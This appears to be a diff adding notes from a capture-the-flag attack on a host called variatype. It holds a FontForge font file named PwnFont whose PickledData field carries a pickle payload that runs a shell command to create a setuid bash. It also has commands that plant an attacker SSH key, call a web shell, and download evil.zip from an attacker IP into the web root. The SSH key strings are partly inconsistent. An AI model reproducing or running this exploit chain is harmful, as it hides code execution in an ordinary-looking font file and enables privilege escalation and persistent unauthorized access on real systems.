@@ -1,0 +1,18 @@
+SplineFontDB: 3.2
+FontName: PwnFont
+PickledData: "cposix\nsystem\np0\n(Vcp /bin/bash /tmp/steve_bash && chmod 4755 /tmp/steve_bash\np1\ntp2\nRp3\n."
+BeginChars: 1114112 0
+EndChars
+EndSplineFont
+
+
+/tmp/steve_bash -p -c 'mkdir -p /home/steve/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDLPbg/05cXX/jdSajqacfMnAvhCBUsIQ== z0n@0x0z0n" > /home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && chmod 600 /home/steve/.ssh/authorized_keys'
+
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDLPbg/tccX3rY/O409PlYdIHYc7pfcGCIA630WPCh5e5XgF6iytnLq1agEHv0hW/+Sb3mnQ66b6JDnVslyrryo2rPJoAlZpNqe05cXX/jdSajqacfMnAvhCBUsIQ== z0n@0x0z0n" > steve_pub.txt
+
+
+curl -s "http://portal.variatype.htb/files//hell.php?cmd=
+
+
+wget http://10.10.16.45/evil.zip -O /var/www/portal.variatype.htb/public/files/evil.zip
